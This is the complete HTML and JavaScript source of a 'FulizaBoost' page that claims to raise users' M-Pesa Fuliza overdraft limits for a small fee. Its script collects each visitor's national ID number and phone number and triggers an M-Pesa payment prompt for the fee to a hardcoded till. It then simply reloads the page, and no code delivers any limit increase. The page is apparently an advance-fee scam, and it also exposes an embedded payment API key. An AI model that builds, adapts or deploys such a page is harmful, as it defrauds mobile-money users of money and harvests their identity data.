<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>Boost Your Fuliza Limit | Get Instant Increase</title>

  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  
  <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">

  <style>
    :root {
      --primary: #2563eb;
      --primary-dark: #1d4ed8;
      --secondary: #7c3aed;
      --accent: #f57c0b;
      --gradient-bg: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
      --card-bg: #ffffff;
      --text-dark: #1e293b;
      --text-muted: #64748b;
      --border-color: #cbd5e1;
      --shadow-sm: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
      --shadow-md: 0 10px 15px -3px rgba(0, 0, 0, 0.07);
      --radius: 16px;
      --radius-sm: 10px;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
    body {
      font-family: 'Poppins', sans-serif;
      background: var(--gradient-bg);
      color: var(--text-dark);
      padding: 12px;
      min-height: 100vh;
    }

    .container { max-width: 440px; margin: 0 auto; }

    .header { text-align: center; margin-bottom: 20px; padding-top: 8px; }
    .logo {
      font-size: 1.8rem;
      font-weight: 800;
      background: linear-gradient(90deg, var(--primary) 0%, var(--secondary) 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .card {
      background: var(--card-bg);
      border-radius: var(--radius);
      padding: 20px;
      box-shadow: var(--shadow-md);
      margin-bottom: 20px;
    }

    .grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 12px;
      margin-bottom: 24px;
    }

    .loan-box {
      border: 2px solid var(--border-color);
      border-radius: var(--radius-sm);
      padding: 16px 12px;
      text-align: center;
      cursor: pointer;
      transition: 0.3s;
    }

    .loan-box.selected {
      border-color: var(--primary);
      background: #eff6ff;
    }

    .amount { font-size: 1.2rem; font-weight: 800; color: var(--primary); }
    .fee { font-size: 0.8rem; color: var(--text-muted); font-weight: 600; }

    .cta {
      background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
      border-radius: 14px;
      padding: 18px;
      text-align: center;
      color: #fff;
      font-size: 1rem;
      font-weight: 700;
      cursor: pointer;
      border: none;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .cta.disabled { opacity: 0.5; cursor: not-allowed; background: #94a3b8; }

    /* Modal Form Styles */
    .swal-input-group { margin-bottom: 15px; text-align: left; }
    .swal-label { display: block; font-weight: 600; margin-bottom: 5px; color: #444; }
    .swal-input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; }
    .phone-flex { display: flex; border: 1px solid #ddd; border-radius: 8px; overflow: hidden; }
    .prefix { background: #eee; padding: 12px; font-weight: 700; border-right: 1px solid #ddd; }
    .phone-field { border: none; padding: 12px; width: 100%; }
  </style>
</head>
<body>

  <div class="container">
    <div class="header">
      <div class="logo">FulizaBoost</div>
      <p style="color: #64748b;">Instant M-Pesa Limit Increase</p>
    </div>

    <div class="card">
      <h3 style="margin-bottom: 15px;"><i class="fas fa-bolt"></i> Select Your New Limit</h3>
      <div class="grid" id="loan-grid"></div>
      
      <button class="cta disabled" id="get-limit-btn" disabled>
        <i class="fas fa-rocket"></i> Select an Amount
      </button>
    </div>
    
    <div style="text-align: center; font-size: 0.8rem; color: #94a3b8;">
      Secure Payment via Lipia Online (Daraja API)
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>

  <script>
    // 1. CONFIGURATION - ADD YOUR DETAILS HERE
    const CONFIG = {
      apiKey: "0350c13c4933dce39d9e0be2913aa2e6916b985d", // Get from Lipia Dashboard
      shortCode: "4717390",          // Your Till or Paybill
      callbackUrl: "https://fulizaboost-five.vercel.app/callback"
    };

    const loanOptions = [
      { amount: 5000, fee: 49 }, { amount: 10000, fee: 100 },
      { amount: 20000, fee: 200 }, { amount: 35000, fee: 350 },
      { amount: 50000, fee: 500 }, { amount: 100000, fee: 950 }
    ];

    let selectedLoan = null;
    let isProcessing = false;

    // Render the grid
    const loanGrid = document.getElementById('loan-grid');
    const getLimitBtn = document.getElementById('get-limit-btn');

    loanOptions.forEach(loan => {
      const div = document.createElement('div');
      div.className = 'loan-box';
      div.innerHTML = `<div class="amount">Ksh ${loan.amount.toLocaleString()}</div><div class="fee">Fee: Ksh ${loan.fee}</div>`;
      div.onclick = () => {
        document.querySelectorAll('.loan-box').forEach(b => b.classList.remove('selected'));
        div.classList.add('selected');
        selectedLoan = loan;
        getLimitBtn.disabled = false;
        getLimitBtn.classList.remove('disabled');
        getLimitBtn.innerHTML = `<i class="fas fa-rocket"></i> Get Ksh ${loan.amount.toLocaleString()} Now`;
      };
      loanGrid.appendChild(div);
    });

    // Handle Payment Initiation
    getLimitBtn.onclick = async () => {
      const { value: formValues } = await Swal.fire({
        title: 'Enter Details',
        html: `
          <div class="swal-input-group">
            <label class="swal-label">ID Number</label>
            <input id="swal-id" class="swal-input" type="number" placeholder="12345678">
          </div>
          <div class="swal-input-group">
            <label class="swal-label">M-Pesa Number</label>
            <div class="phone-flex">
              <div class="prefix">+254</div>
              <input id="swal-phone" class="phone-field" type="number" placeholder="712345678">
            </div>
          </div>`,
        showCancelButton: true,
        confirmButtonText: 'Send STK Push',
        preConfirm: () => {
          const id = document.getElementById('swal-id').value;
          const phone = document.getElementById('swal-phone').value;
          if (!id || phone.length !== 9) {
            Swal.showValidationMessage('Enter valid ID and 9-digit phone');
            return false;
          }
          return { id, phone: "254" + phone };
        }
      });

      if (formValues) {
        processSTK(formValues.phone);
      }
    };

    async function processSTK(fullPhone) {
      if (isProcessing) return;
      isProcessing = true;

      Swal.fire({
        title: 'Connecting...',
        text: 'Check your phone for the M-Pesa PIN prompt',
        allowOutsideClick: false,
        didOpen: () => Swal.showLoading()
      });

      try {
        const response = await fetch('https://lipia-online.vercel.app/api/v1/stk-push', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            api_key: CONFIG.apiKey,
            phone_number: fullPhone,
            amount: selectedLoan.fee.toString(),
            short_code: CONFIG.shortCode,
            callback_url: CONFIG.callbackUrl
          })
        });

        const result = await response.json();

        if (result.status === 'success' || result.ResponseCode === "0") {
          Swal.fire({
            icon: 'success',
            title: 'Request Sent',
            text: 'Please enter your M-Pesa PIN on your phone to complete.',
            confirmButtonText: 'I have paid'
          }).then(() => location.reload());
        } else {
          throw new Error(result.message || 'Payment failed to initiate');
        }
      } catch (err) {
        Swal.fire({ icon: 'error', title: 'Fetch Error', text: err.message });
      } finally {
        isProcessing = false;
      }
    }
  </script>
</body>
</html>
